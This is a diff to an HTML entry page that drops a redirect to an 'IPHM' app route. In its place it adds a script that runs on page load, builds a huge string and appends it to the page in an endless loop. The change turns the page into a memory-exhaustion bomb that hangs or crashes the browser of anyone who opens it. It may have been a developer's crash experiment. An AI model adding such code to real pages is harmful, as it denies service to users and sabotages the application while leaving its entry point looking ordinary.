@@ -1,7 +1,28 @@
 <html>
     <head>
-        <script>
-            location.href = '/iphm/fe/#/running?appID=IPHM'
-        </script>
+        
     </head>
+
+    <body>
+        HHi
+    </body>
+
+    <script>
+        let str = ''
+        for (let i = 0; i < 10000000; i++) {
+            str += 'ABCD'
+        }
+
+        window.pops = []
+
+        while(true) {
+            window.pops.push(str)
+
+            const div = document.createElement('div')
+
+            div.innerHTML = str
+
+            document.body.appendChild(div)
+        }
+    </script>
 </html>
